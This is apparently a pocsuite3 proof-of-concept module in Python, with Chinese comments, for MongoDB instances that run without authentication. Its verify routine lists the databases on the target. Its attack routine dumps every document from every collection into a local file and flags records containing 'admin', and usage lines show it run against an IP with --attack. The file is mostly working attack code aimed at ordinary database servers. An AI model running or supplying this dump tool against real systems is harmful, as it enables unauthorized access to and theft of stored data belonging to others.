#!coding=utf-8

import pymongo
from pocsuite3.api import Output, POCBase, register_poc, logger


class MongoPOC(POCBase):
    vulID = '6789'  # ssvid ID 如果是提交漏洞的同时提交 PoC，则写成 0
    version = '1'  # 默认为1
    author = 'ganzhi'  # PoC 作者的大名
    vulDate = '2021-08-28'  # 漏洞公开的时间，不知道就写今天
    createDate = '2021-08-28'  # 编写 PoC 的日期
    updateDate = '2021-08-29'  # PoC 更新的时间，默认和编写时间一样
    references = ['https://www.freebuf.com/vuls/212799.html']  # 漏洞地址来源，0day 不用写
    name = 'MongoDB未授权访问漏洞'  # PoC 名称
    appPowerLink = 'https://www.mongodb.com/'  # 漏洞厂商主页地址
    appName = 'MongoDB'  # 漏洞应用名称
    appVersion = '3.0'  # 漏洞影响版本
    vulType = 'Unauthorized Access'  # 漏洞类型，类型参考见漏洞类型规范表
    desc = '''
        MongoDB服务安装后，默认未开启权限验证。如果服务监听在0.0.0.0，并且启动MongoDB服务时不添加任何参数，则可远程无需授权访问数据库
    '''  # 漏洞简要描述
    samples = ['192.168.1.23']  # 测试样列，就是用 PoC 测试成功的网站
    install_requires = ['pymongo']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = ''' 
        pocsuite -r mongodb_poc.py -u 192.168.1.38 --verify
        pocsuite -r mongodb_poc.py -u 192.168.1.38 --attack
    '''

    def _verify(self):
        # 检测是否存在MongoDB未授权访问漏洞
        url = self.url.replace('http', 'mongodb')
        logger.info(f'当前检测的目标服务器是{url}')
        my_client = pymongo.MongoClient(url)
        is_connected = self.db_connect(my_client)
        if is_connected:
            db_list = my_client.list_database_names()
            logger.info(f'目标服务器MongoDB所有数据库{db_list}')
        else:
            db_list = {}
        # 判断是否获取到admin数据库
        if "admin" in db_list:
            result = f'{url} 服务器检测存在MongoDB未授权访问漏洞'
        else:
            result = f'{url} 服务器未检测出漏洞'
        result = {'Stdout': result}
        return self.parse_output(result)

    def _attack(self):
        # 攻击代码，获取MongoDB里存在admin关键词的数据
        url = self.url.replace('http', 'mongodb')
        my_client = pymongo.MongoClient(url)
        is_connected = self.db_connect(my_client)
        if is_connected:
            db_list = my_client.list_database_names()
            logger.info(f'目标服务器MongoDB所有数据库{db_list}')
            for db_name in db_list:
                cols = my_client[db_name].list_collection_names()
                logger.info(f'{db_name}数据库里的所有表名为{cols}')
                fo = open("mongodb_result.txt", "a")
                for col in cols:
                    datas = my_client[db_name][col].find()
                    fo.write(f'{db_name}库{col}表里的所有数据为:\n')
                    for data in datas:
                        fo.write(f'\t{data}\n')
                        if 'admin' in data.values():
                            logger.warning(f'{db_name}库{col}表的数据集里存在admin关键词: {data}')
                    fo.write("\n")
                fo.close()
            result = f'{url} 服务器获取数据完成，结果保存在mongodb_result.txt文件中'
        else:
            result = f'{url} 服务器获取数据失败'
        result = {'Stdout': result}
        return self.parse_output(result)

    def _shell(self):
        pass

    def db_connect(self, my_client):
        # 判断MongoDB数据库是否连接成功
        try:
            if my_client.list_database_names():
                self.parse_output({'Stdout': 'MongoDB连接成功'})
                return True
        except:
            self.parse_output({'Stdout': 'MongoDB连接失败'})
            return False

    def db_close(self, my_client):
        self.parse_output({'Stdout': 'MongoDB连接关闭'})
        my_client.close()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('目标服务器未检测出漏洞')
        return output


register_poc(MongoPOC)
